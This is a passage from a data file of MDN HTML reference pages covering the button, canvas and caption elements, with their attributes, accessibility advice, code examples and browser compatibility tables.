| 1.0              | 4.4             |     |\n| `clear` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<address>`](address) element\n- [`<p>`](p) element\n- [`<wbr>`](wbr) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/br](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/br)"
- name: button
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<button\\>: The Button element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fbutton&level=high)\n\nThe `<button>` [HTML](../index) element is an interactive element activated by a user with a mouse, keyboard, finger, voice command, or other assistive technology. Once activated, it then performs an action, such as submitting a [form](https://developer.mozilla.org/en-US/docs/Learn/Forms) or opening a dialog.\n\nBy default, HTML buttons are presented in a style resembling the platform the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) runs on, but you can change buttons' appearance with [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS).\n\n## Try it\n\n#### HTML Demo: \\<button\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <button class=\"favorite styled\" type=\"button\">Add to favorites</button>\n\n    .styled {\n      border: 0;\n      line-height: 2.5;\n      padding: 0 20px;\n      font-size: 1rem;\n      text-align: center;\n      color: #fff;\n      text-shadow: 1px 1px 1px #000;\n      border-radius: 10px;\n      background-color: rgba(220, 0, 0, 1);\n      background-image: linear-gradient(\n        to top left,\n        rgba(0, 0, 0, 0.2),\n        rgba(0, 0, 0, 0.2) 30%,\n        rgba(0, 0, 0, 0)\n      );\n      box-shadow:\n        inset 2px 2px 3px rgba(255, 255, 255, 0.6),\n        inset -2px -2px 3px rgba(0, 0, 0, 0.6);\n    }\n\n    .styled:hover {\n      background-color: rgba(255, 0, 0, 1);\n    }\n\n    .styled:active {\n      box-shadow:\n        inset -2px -2px 3px rgba(255, 255, 255, 0.6),\n        inset 2px 2px 3px rgba(0, 0, 0, 0.6);\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`autofocus`](#autofocus)  \nThis Boolean attribute specifies that the button should have input [focus](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/focus) when the page loads. **Only one element in a document can have this attribute.**\n\n[`disabled`](../attributes/disabled)  \nThis Boolean attribute prevents the user from interacting with the button: it cannot be pressed or focused.\n\n[`form`](#form)  \nThe [`<form>`](form) element to associate the button with (its *form owner*). The value of this attribute must be the `id` of a `<form>` in the same document. (If this attribute is not set, the `<button>` is associated with its ancestor `<form>` element, if any.)\n\nThis attribute lets you associate `<button>` elements to `<form>`s anywhere in the document, not just inside a `<form>`. It can also override an ancestor `<form>` element.\n\n[`formaction`](#formaction)  \nThe URL that processes the information submitted by the button. Overrides the [`action`](form#action) attribute of the button's form owner. Does nothing if there is no form owner.\n\n[`formenctype`](#formenctype)  \nIf the button is a submit button (it's inside/associated with a `<form>` and doesn't have `type=\"button\"`), specifies how to encode the form data that is submitted. Possible values:\n\n- `application/x-www-form-urlencoded`: The default if the attribute is not used.\n- `multipart/form-data`: Used to submit [`<input>`](input) elements with their [`type`](input#type) attributes set to `file`.\n- `text/plain`: Specified as a debugging aid; shouldn't be used for real form submission.\n\nIf this attribute is specified, it overrides the [`enctype`](form#enctype) attribute of the button's form owner.\n\n[`formmethod`](#formmethod)  \nIf the button is a submit button (it's inside/associated with a `<form>` and doesn't have `type=\"button\"`), this attribute specifies the [HTTP method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) used to submit the form. Possible values:\n\n- `post`: The data from the form are included in the body of the HTTP request when sent to the server. Use when the form contains information that shouldn't be public, like login credentials.\n- `get`: The form data are appended to the form's `action` URL, with a `?` as a separator, and the resulting URL is sent to the server. Use this method when the form [has no side effects](https://developer.mozilla.org/en-US/docs/Glossary/Idempotent), like search forms.\n- `dialog`: This method is used to indicate that the button closes the [dialog](dialog) with which it is associated, and does not transmit the form data at all.\n\nIf specified, this attribute overrides the [`method`](form#method) attribute of the button's form owner.\n\n[`formnovalidate`](#formnovalidate)  \nIf the button is a submit button, this Boolean attribute specifies that the form is not to be [validated](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation) when it is submitted. If this attribute is specified, it overrides the [`novalidate`](form#novalidate) attribute of the button's form owner.\n\nThis attribute is also available on [`<input type=\"image\">`](input/image) and [`<input type=\"submit\">`](input/submit) elements.\n\n[`formtarget`](#formtarget)  \nIf the button is a submit button, this attribute is an author-defined name or standardized, underscore-prefixed keyword indicating where to display the response from submitting the form. This is the `name` of, or keyword for, a *browsing context* (a tab, window, or [`<iframe>`](iframe)). If this attribute is specified, it overrides the [`target`](form#target) attribute of the button's form owner. The following keywords have special meanings:\n\n- `_self`: Load the response into the same browsing context as the current one. This is the default if the attribute is not specified.\n- `_blank`: Load the response into a new unnamed browsing context — usually a new tab or window, depending on the user's browser settings.\n- `_parent`: Load the response into the parent browsing context of the current one. If there is no parent, this option behaves the same way as `_self`.\n- `_top`: Load the response into the top-level browsing context (that is, the browsing context that is an ancestor of the current one, and has no parent). If there is no parent, this option behaves the same way as `_self`.\n\n[`name`](#name)  \nThe name of the button, submitted as a pair with the button's `value` as part of the form data, when that button is used to submit the form.\n\n[`popovertarget`](#popovertarget)  \nTurns a `<button>` element into a popover control button; takes the ID of the popover element to control as its value. See the [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API) landing page for more details.\n\n[`popovertargetaction`](#popovertargetaction)  \nSpecifies the action to be performed on a popover element being controlled by a control `<button>`. Possible values are:\n\n[`\"hide\"`](#hide)  \nThe button will hide a shown popover. If you try to hide an already hidden popover, no action will be taken.\n\n[`\"show\"`](#show)  \nThe button will show a hidden popover. If you try to show an already showing popover, no action will be taken.\n\n[`\"toggle\"`](#toggle)  \nThe button will toggle a popover between showing and hidden. If the popover is hidden, it will be shown; if the popover is showing, it will be hidden. If `popovertargetaction` is omitted, `\"toggle\"` is the default action that will be performed by the control button.\n\n[`type`](#type)  \nThe default behavior of the button. Possible values are:\n\n- `submit`: The button submits the form data to the server. This is the default if the attribute is not specified for buttons associated with a `<form>`, or if the attribute is an empty or invalid value.\n- `reset`: The button resets all the controls to their initial values, like [\\<input type=\"reset\"\\>](input/reset). (This behavior tends to annoy users.)\n- `button`: The button has no default behavior, and does nothing when pressed by default. It can have client-side scripts listen to the element's events, which are triggered when the events occur.\n\n[`value`](#value)  \nDefines the value associated with the button's `name` when it's submitted with the form data. This value is passed to the server in params when the form is submitted using this button.\n\n## Notes\n\nA submit button with the attribute `formaction` set, but without an associated form does nothing. You have to set a form owner, either by wrapping it in a `<form>` or set the attribute `form` to the id of the form.\n\n`<button>` elements are much easier to style than [`<input>`](input) elements. You can add inner HTML content (think `<i>`, `<br>`, or even `<img>`), and use [`::after`](https://developer.mozilla.org/en-US/docs/Web/CSS/::after) and [`::before`](https://developer.mozilla.org/en-US/docs/Web/CSS/::before) pseudo-elements for complex rendering.\n\nIf your buttons are not for submitting form data to a server, be sure to set their `type` attribute to `button`. Otherwise, they will try to submit form data and to load the (nonexistent) response, possibly destroying the current state of the document.\n\nWhile `<button type=\"button\">` has no default behavior, event handlers can be scripted to trigger behaviors. An activated button can perform programmable actions using [JavaScript](https://developer.mozilla.org/en-US/docs/Learn/JavaScript), such as removing an item from a list.\n\nBy default, user agents style buttons as `display: flow-root`, which establishes a new [block formatting context](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_display/Block_formatting_context) and centers the button's children both horizontally and vertically as long as they do not overflow. If the button is defined as a flex or grid container, the children will behave as flex or grid items. A button set to `display: inline` will be styled as if the value were set to `display: inline-block`.\n\n## Accessibility\n\n### Icon buttons\n\nButtons that only display an icon do not have an *[accessible name](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_name)*. Accessible names provide information for assistive technology, such as screen readers, to access when they parse the document and generate [an accessibility tree](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/What_is_accessibility#accessibility_apis). Assistive technology then uses the accessibility tree to navigate and manipulate page content.\n\nTo give an icon button an accessible name, put text in the `<button>` element that concisely describes the button's functionality.\n\n#### Examples\n\nhtml\n\n```\n<button name=\"favorite\">\n  <svg aria-hidden=\"true\" viewBox=\"0 0 10 10\">\n    <path d=\"M7 9L5 8 3 9V6L1 4h3l1-3 1 3h3L7 6z\" />\n  </svg>\n  Add to favorites\n</button>\n```\n\n##### Result\n\nIf you want to visually hide the button's text, an accessible way to do so is to use [a combination of CSS properties](https://www.a11yproject.com/posts/how-to-hide-content/) to remove it visually from the screen, but keep it parsable by assistive technology.\n\nHowever, it is worth noting that leaving the button text visible can help people who may not be familiar with the icon's meaning or understand the button's purpose. This is especially important for people who are not technologically sophisticated or who may have different cultural interpretations of the icon the button uses.\n\n- [What is an accessible name? \\| The Paciello Group](https://www.tpgi.com/what-is-an-accessible-name/)\n- [MDN Understanding WCAG, Guideline 4.1 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Robust#guideline_4.1_%E2%80%94_compatible_maximize_compatibility_with_current_and_future_user_agents_including_assistive_technologies)\n- [Understanding Success Criterion 4.1.2 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/ensure-compat-rsv.html)\n\n### Size and Proximity\n\n#### Size\n\nInteractive elements such as buttons should have an area large enough to be easy to activate. This helps a variety of people, including people with motor control issues and people using non-precise forms of input such as a stylus or fingers. A minimum interactive size of 44×44 [CSS pixels](https://developer.mozilla.org/en-US/docs/Glossary/CSS_pixel) is recommended.\n\n- [Understanding Success Criterion 2.5.5: Target Size \\| W3C Understanding WCAG 2.1](https://www.w3.org/WAI/WCAG21/Understanding/target-size.html)\n- [Target Size and 2.5.5 \\| Adrian Roselli](https://adrianroselli.com/2019/06/target-size-and-2-5-5.html)\n- [Quick test: Large touch targets - The A11Y Project](https://www.a11yproject.com/posts/large-touch-targets/)\n\n#### Proximity\n\nLarge amounts of interactive content — including buttons — placed in close visual proximity to each other should have space separating them. This spacing is beneficial for people who are experiencing motor control issues, who may accidentally activate the wrong interactive content.\n\nSpacing may be created using CSS properties such as [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin).\n\n- [Hand tremors and the giant-button-problem - Axess Lab](https://axesslab.com/hand-tremors/)\n\n### ARIA state information\n\nTo describe the state of a button the correct ARIA attribute to use is [`aria-pressed`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-pressed) and not [`aria-checked`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-checked) or [`aria-selected`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-selected). To find out more read the information about the [ARIA button role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role).\n\n### Button styles\n\nIt is best not to override the default focus ring for elements that have focus. If the button styles are overridden, it is important to **ensure that the focus state has enough contrast** so that people experiencing low vision conditions can perceive it and people with cognitive differences will understand it.\n\nThe [`:focus-visible`](https://developer.mozilla.org/en-US/docs/Web/CSS/:focus-visible) pseudo-class can be used to apply styles to an element that has [`:focus`](https://developer.mozilla.org/en-US/docs/Web/CSS/:focus) only when the user agent's heuristics determine that the focus should be highlighted, such as when a `<button>` receives keyboard focus. See [:focus vs :focus-visible](https://developer.mozilla.org/en-US/docs/Web/CSS/:focus-visible#focus_vs_focus-visible) for more information.\n\nColor contrast ratio is determined by comparing the luminosity of the button text and background color values to the background the button is placed on. To meet current [Web Content Accessibility Guidelines (WCAG)](https://www.w3.org/WAI/standards-guidelines/wcag/), a ratio of 4.5:1 is required for text content and 3:1 for large text. (Large text is defined as 18.66px and [`bold`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) or larger, or 24px or larger.)\n\n- [WebAIM: Color Contrast Checker](https://webaim.org/resources/contrastchecker/)\n- [MDN Understanding WCAG, Guideline 1.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.4_make_it_easier_for_users_to_see_and_hear_content_including_separating_foreground_from_background)\n- [Understanding Success Criterion 1.4.3 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/visual-audio-contrast-contrast.html)\n\n### Clicking and focus\n\nWhether clicking on a `<button>` or [`<input>`](input) button types causes it to (by default) become focused varies by browser and OS. Most browsers do give focus to a button being clicked, but [Safari does not, by design](https://webkit.org/b/22261).\n\n## Examples\n\nhtml\n\n```\n<button name=\"button\">Press me</button>\n```\n\n## Technical summary\n\n|                                             ||\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [Interactive content](../content_categories#interactive_content), [listed](../content_categories#form_listed), [labelable](../content_categories#form_labelable), and [submittable](../content_categories#form_submittable) [form-associated](../content_categories#form-associated_content) element, palpable content|\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content) but there must be no [Interactive content](../content_categories#interactive_content|\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content|\n| Implicit ARIA role                          | [`button`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role|\n| Permitted ARIA roles                        | [`checkbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/checkbox_role), [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role), [`link`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/link_role), [`menuitem`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitem_role), [`menuitemcheckbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitemcheckbox_role), [`menuitemradio`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menuitemradio_role), [`option`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/option_role), [`radio`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radio_role), [`switch`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/switch_role), [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role) |\n| DOM interface                               | [`HTMLButtonElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLButtonElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `button`              | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `disabled`            | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `form`                | 9       | 16   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 4.4             |     |\n| `formaction`          | 9       | 12   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 37              |     |\n| `formenctype`         | 9       | 12   | 4       | 10.6  | 5.1    | 18             | 4                   | 11            | 5             | 1.0              | 37              |     |\n| `formmethod`          | 9       | 12   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 37              |     |\n| `formnovalidate`      | 9       | 12   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 4.4             |     |\n| `formtarget`          | 9       | 12   | 4       | 15    | 5.1    | 18             | 4                   | 14            | 5             | 1.0              | 4.4             |     |\n| `name`                | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `popovertarget`       | 114     | 114  | 125     | 100   | 17     | 114            | 125                 | 76            | 17            | 23.0             | 114             |     |\n| `popovertargetaction` | 114     | 114  | 125     | 100   | 17     | 114            | 125                 | 76            | 17            | 23.0             | 114             |     |\n| `type`                | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `value`               | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button)"
- name: canvas
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<canvas\\>: The Graphics Canvas element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcanvas&level=high)\n\nUse the `<canvas>` with either the [canvas scripting API](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API) or the [WebGL API](https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API) to draw graphics and animations.\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`height`](#height)  \nThe height of the coordinate space in CSS pixels. Defaults to 150.\n\n[`moz-opaque`](#moz-opaque) Non-standard Deprecated  \nLets the canvas know whether translucency will be a factor. If the canvas knows there's no translucency, painting performance can be optimized. This is only supported by Mozilla-based browsers; use the standardized [`canvas.getContext('2d', { alpha: false })`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/getContext) instead.\n\n[`width`](#width)  \nThe width of the coordinate space in CSS pixels. Defaults to 300.\n\n## Usage notes\n\n### Alternative content\n\nYou should provide alternate content inside the `<canvas>` block. That content will be rendered both on older browsers that don't support canvas and in browsers with JavaScript disabled.\n\n### Closing `</canvas>` tag\n\nUnlike the [`<img>`](img) element, the `<canvas>` element **requires** the closing tag (`</canvas>`).\n\n### Sizing the canvas using CSS versus HTML\n\nThe displayed size of the canvas can be changed using CSS, but if you do this the image is scaled during rendering to fit the styled size, which can make the final graphics rendering end up being distorted.\n\nIt is better to specify your canvas dimensions by setting the `width` and `height` attributes directly on the `<canvas>` elements, either directly in the HTML or by using JavaScript.\n\n### Maximum canvas size\n\nThe exact maximum size of a `<canvas>` element depends on the browser and environment. While in most cases the maximum dimensions exceed 10,000 x 10,000 pixels, notably iOS devices limit the canvas size to only 4,096 x 4,096 pixels. See [canvas size limits in different browsers and devices](https://jhildenbiddle.github.io/canvas-size/#/?id=test-results).\n\n**Note:** Exceeding the maximum dimensions or area renders the canvas unusable — drawing commands will not work.\n\n### Using an offscreen canvas\n\nA canvas can be rendered using the [`OffscreenCanvas`](https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas) API where the document and canvas are decoupled. The benefit is that a [worker thread](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers) can handle canvas rendering and the main thread of your web application is not blocked by canvas operations. By parallelizing work, other UI elements of your web application will remain responsive even if you are running complex graphics on an offscreen canvas. For more information, see the [`OffscreenCanvas`](https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas) API documentation.\n\n## Accessibility\n\n### Alternative content\n\nThe `<canvas>` element on its own is just a bitmap and does not provide information about any drawn objects. Canvas content is not exposed to accessibility tools as semantic HTML is. In general, you should avoid using canvas in an accessible website or app. The following guides can help to make it more accessible.\n\n- [Canvas accessibility use cases](https://www.w3.org/WAI/PF/HTML/wiki/Canvas_Accessibility_Use_Cases)\n- [Canvas element accessibility issues](https://www.w3.org/html/wg/wiki/AddedElementCanvas)\n- [HTML Canvas Accessibility in Firefox 13 – by Steve Faulkner](https://www.tpgi.com/html5-canvas-accessibility-in-firefox-13/)\n- [Best practices for interactive canvas elements](https://html.spec.whatwg.org/multipage/scripting.html#best-practices)\n\n## Examples\n\n### HTML\n\nThis code snippet adds a canvas element to your HTML document. A fallback text is provided if a browser is unable to read or render the canvas.\n\nhtml\n\n```\n<canvas width=\"120\" height=\"120\">\n  An alternative text describing what your canvas displays.\n</canvas>\n```\n\n### JavaScript\n\nThen in the JavaScript code, call [`HTMLCanvasElement.getContext()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/getContext) to get a drawing context and start drawing onto the canvas:\n\njs\n\n```\nconst canvas = document.querySelector(\"canvas\");\nconst ctx = canvas.getContext(\"2d\");\nctx.fillStyle = \"green\";\n// Add a rectangle at (10, 10) with size 100x100 pixels\nctx.fillRect(10, 10, 100, 100);\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                           |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [embedded content](../content_categories#embedded_content), palpable content.                                                                             |\n| Permitted content                           | Transparent but with no [interactive content](../content_categories#interactive_content) descendants except for [`<a>`](a) elements, [`<button>`](button) elements, [`<input>`](input) elements whose [`type`](input#type) attribute is `checkbox`, `radio`, or `button`. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                     |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                      |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                       |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                                       |\n| DOM interface                               | [`HTMLCanvasElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement)                                                                                                                                                                                 |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Canvas API](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API)\n- [Canvas tutorial](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial)\n- [OffscreenCanvas](https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas)\n- [Canvas cheat sheet](https://simon.html5.org/dump/html5-canvas-cheat-sheet.html) (2009)\n- [Canvas cheat sheet](https://websitesetup.org/wp-content/uploads/2015/11/Infopgraphic-CanvasCheatSheet-Final2.pdf) (pdf) (2015)\n- [Safari HTML canvas guide](https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/HTML-canvas-guide/Introduction/Introduction.html) via Apple (2013)\n- [`CanvasRenderingContext2D` 2D drawing context for a canvas element](https://developer.apple.com/documentation/webkitjs/canvasrenderingcontext2d) via Apple.com\n- [WebGL](https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API) API\n- [`<img>`](img)\n- [SVG](https://developer.mozilla.org/en-US/docs/Web/SVG)\n- [Using HTML audio and video](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/canvas](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/canvas)"
- name: caption
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<caption\\>: The Table Caption element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcaption&level=high)\n\nThe `<caption>` [HTML](../index) element specifies the caption (or title) of a table, providing the table an [accessible description](https://developer.mozilla.org/en-US/docs/Glossary/Accessible_description).\n\n## Try it\n\n#### HTML Demo: \\<caption\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        He-Man and Skeletor facts\n      </caption>\n      <tr>\n        <td></td>\n        <th scope=\"col\" class=\"heman\">He-Man</th>\n        <th scope=\"col\" class=\"skeletor\">Skeletor</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">Role</th>\n        <td>Hero</td>\n        <td>Villain</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Weapon</th>\n        <td>Power Sword</td>\n        <td>Havoc Staff</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Dark secret</th>\n        <td>Expert florist</td>\n        <td>Cries at romcoms</td>\n      </tr>\n    </table>\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n      font-weight: bold;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    th {\n      background-color: rgb(230 230 230);\n    }\n\n    td {\n      text-align: center;\n    }\n\n    tr:nth-child(even) td {\n      background-color: rgb(250 250 250);\n    }\n\n    tr:nth-child(odd) td {\n      background-color: rgb(240 240 240);\n    }\n\n    .heman {\n      font: 1.4rem molot;\n      text-shadow:\n        1px 1px 1px #fff,\n        2px 2px 1px #000;\n    }\n\n    .skeletor {\n      font: 1.7rem rapscallion;\n      letter-spacing: 3px;\n      text-shadow:\n        1px 1px 0 #fff,\n        0 0 9px #000;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies on which side of the table the caption should be displayed. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `top`, `right`, or `bottom`. Use the [`caption-side`](https://developer.mozilla.org/en-US/docs/Web/CSS/caption-side) and [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS properties instead, as this attribute is deprecated.\n\n## Usage notes\n\n- If included, the `<caption>` element must be the first child of its parent [`<table>`](table) element.\n- When a `<table>` is nested within a [`<figure>`](figure) as the figure's only content, it should be captioned via a [`<figcaption>`](figcaption) for the `<figure>` instead of as a `<caption>` nested within the `<table>`.\n- Any [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) applied to a table will not be applied to its caption. Add a `background-color` to the `<caption>` element as well if you want the same color to be behind both.\n\n## Example\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Table with caption\n\nThis example demonstrates a basic table that includes a caption describing the data presented.\n\nSuch a \"title\" is helpful for users who are quickly scanning the page, and it is especially beneficial for visually impaired users, allowing them to determine the table's relevance quickly without the need to have a screen reader read the contents of many cells just to find out what the table is about.\n\n#### HTML\n\nA `<caption>` element is used as the first child of the [`<table>`](table), with text content similar to a title to describe the table data. Three rows, the first being a header row, with two columns are created using the [`<tr>`](tr), [`<th>`](th) and [`<td>`](td) elements after the `<caption>`.\n\nhtml\n\n```\n<table>\n  <caption>\n    User login email addresses\n  </caption>\n  <tr>\n    <th>Login</th>\n    <th>Email</th>\n  </tr>\n  <tr>\n    <td>user1</td>\n    <td>user1@example.com</td>\n  </tr>\n  <tr>\n    <td>user2</td>\n    <td>user2@example.com</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nSome basic CSS is used to align and highlight the `<caption>`.\n\ncss\n\n```\ncaption {\n  caption-side: top;\n  text-align: left;\n  padding-bottom: 10px;\n  font-weight: bold;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                            |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                      |\n| Permitted content                           | [Flow content](../content_categories#flow_content).                                                                                        |\n| Tag omission                                | The end tag can be omitted if the element is not immediately followed by ASCII whitespace or a comment.                                    |\n| Permitted parents                           | A [`<table>`](table) element, as its first descendant.                                                                                     |\n| Implicit ARIA role                          | [`caption`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                        |\n| DOM interface                               | 